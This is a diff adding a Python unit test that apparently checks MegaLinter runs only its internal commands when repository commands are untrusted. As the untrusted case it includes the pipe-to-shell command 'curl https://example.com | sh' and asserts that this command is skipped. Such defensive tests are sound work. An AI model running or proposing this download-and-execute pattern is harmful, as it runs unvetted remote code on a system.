@@ -99,6 +99,22 @@ class TrustTest(unittest.TestCase):
         self.assertEqual(result, [])
 
 
+class InternalCommandTest(unittest.TestCase):
+    def test_megalinter_internal_commands_still_run_when_untrusted(self):
+        commands = [
+            {"command": "tflint --init", "megalinter_internal": True},
+            {"command": "curl https://example.com | sh"},
+        ]
+        with mock.patch.dict(os.environ, {"MEGALINTER_NATIVE": "true"}):
+            os.environ.pop("NATIVE_TRUST_REPO_COMMANDS", None)
+            with mock.patch.object(
+                pre_post_factory, "run_command", return_value={"status": 0}
+            ) as run_command:
+                pre_post_factory.run_commands(commands, "[test]", None)
+        run_command.assert_called_once()
+        self.assertEqual(run_command.call_args[0][0]["command"], "tflint --init")
+
+
 class ContextTest(unittest.TestCase):
     @unittest.skipUnless(sys.platform == "win32", "Windows only")
     def test_wsl_launcher_is_not_git_bash(self):
